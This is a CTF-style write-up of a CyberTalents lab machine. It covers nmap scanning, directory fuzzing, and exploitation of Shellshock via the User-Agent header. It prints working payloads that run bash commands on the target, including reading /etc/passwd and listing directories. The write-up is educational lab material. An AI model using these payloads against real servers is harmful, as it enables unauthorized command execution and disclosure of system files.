---
title: "CyberTalents INSIDE Machine Writeup | CyberGuy"
date: "2021-08-03"
layout: single
---
![main](https://i.ibb.co/sjH5HpX/2021-08-03-12-39.png)

Hi & welcome to INSIDE Machine Writeup by CyberGuy, in this writeup we will solve this machine wich exists in CyberTalents platform, so let's start.

First as you can see in the image, our machine IP is: 18.185.92.165, So first let's try to perform some port scanning on that IP Address to see what are the open ports in it by performing the command below:
```
nmap -sS -sV -p- 18.185.92.165
```
So this command got the following switches:
- -sS This swithch is to tell nmap to perform SynSlyth scanning / Half TCP scanning
- -sV This switch is to extract the ports services versions
- -p- This switch is to scan all network ports which is `65,535`

So after doing some port scanning i get the following results:

![ports](https://i.ibb.co/d6qWz6w/9.png)

Then you can see that there is tow open ports:

- 21 **SSH**
- 3333 **HTTP**

So now let's try entering the port **3333** from the browser by entering:
```
http://18.185.92.165:3333
```
![web](https://i.ibb.co/b1D8HTq/2.png)
Now let's try to make a simple reconnaissance in this web application to gather some info's like:

- Web server
- Files & Directories exists in the application
- Checking server verision 
- Searching for public exploits of any attractive paths / version

So now let's start with knowing the server version by entering unexist file like:
```
http://18.185.92.165:3333/cyberguy
```
This will make the server return `404 Not Found` error which some times contains server info's like:
- Server name
- Server version

![server](https://i.ibb.co/t2y6kbW/2021-08-03-13-30.png)

So now we know the follwoing:

- Sevrer name: Apache
- Operating System: Debian
- Server Version: 2.2.22

Now let's try performing some fuzzing in the application, here I'll use the SecLists wordlist, so clone the SecList using the command:
```
git clone https://github.com/danielmiessler/SecLists.git
```
I'll use the dirsearch tool to fuzz the application using the following command:
```
dirsearch -u "http://18.185.92.165:3333/" -w SecLists/Discovery/Web-Content/common.txt
```
Switches explained:
- -u to specify the **url** / **endpoint** you wanna fuzz
- -w to specify the **wordlist** you will use while fuzzing

![fuzz](https://i.ibb.co/942yK5R/2021-08-03-13-46.png)

As you can see here there is alot of endpoints, but there is an attractive endpoint which is `cgi-bin`, but let me tell you why:
- `cgi-bin` directory means that the `cgi-mod` enabled in the apache server
- the `cgi` refers to **Comman Gateway Interface**, and the `bin` refers to `binary`
- so in this directory the `cgi scripts` exists which the scripts should be executed through the browser like: ```https://www.example.com/cgi-bin/samplescript.pl```
- so now if you serch for the vulnerabilities could be executed if this mod enabled in apache server you will see that you can perform shell shock attack here, let's see how.

First let's try to enter any accessible file here, so we have to methods:
- First: try to enter a file named `status`, this file shows the status of the server like the load avarege & server uptime
- Second: fuzz the server using the command:
```
dirsearch -u "http://18.185.92.165:3333/cgi-bin/" -w SecLists/Discovery/Web-Content/common.txt
```
Now you will see that the result is:
![status](https://i.ibb.co/MCPGbRV/2021-08-03-14-03.png)

Let's try accessing this file through the browser to see what this file contains:
![show](https://i.ibb.co/HVmM5KW/2021-08-03-14-04.png)

Now before exploiting the shell shock vulnerability i suggest to read this PDF from OWASP about **[ShellShock](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)** Vulnerabilities.

Now let's open up the burpsuite to make the job easire & to manipulate some headers:

![burp](https://i.ibb.co/6JXyG8W/2021-08-03-14-09.png)

So let's try injecting this payload in the User-Agent HTTP Header:
```
() { :; }; echo; echo; echo;echo "CyberGuy is here";
```
So breifly what this command do ?
- Simply this command will create an empty function then performing bash commands as shown

So as you can see the code exploited successfully:
![echo](https://i.ibb.co/nDPDKsq/2021-08-03-14-24.png)

Now let's try performing command like: `cat /etc/pwd` in order to list the users of the server by entering:
```
() { :; }; echo; echo; echo;cat '/etc/passwd';
```
But it will not be executed:
![non](https://i.ibb.co/Kzs217J/2021-08-03-14-28.png)

So let's try entering the command through the `/bin/bash` command and specify the command using `-c` switch like that:
```
() { :; }; echo; echo; echo;/bin/bash -c 'cat /etc/passwd';
```
![cmd](https://i.ibb.co/7knhxmC/2021-08-03-14-47.png)

As you can see it really works!, so let's try knowing & listing the current path using:
```
() { :; }; echo; echo; echo;/bin/bash -c 'pwd; ls -lah';
```
![pwd](https://i.ibb.co/5vFppmN/2021-08-03-14-50.png)

Now let's try entering the `/home/` directory to see if there any user not listed in the `/etc/passwd` file or any other hidden data:

```
() { :; }; echo; echo; echo;/bin/bash -c 'cd /home/ && ls -lah';
```
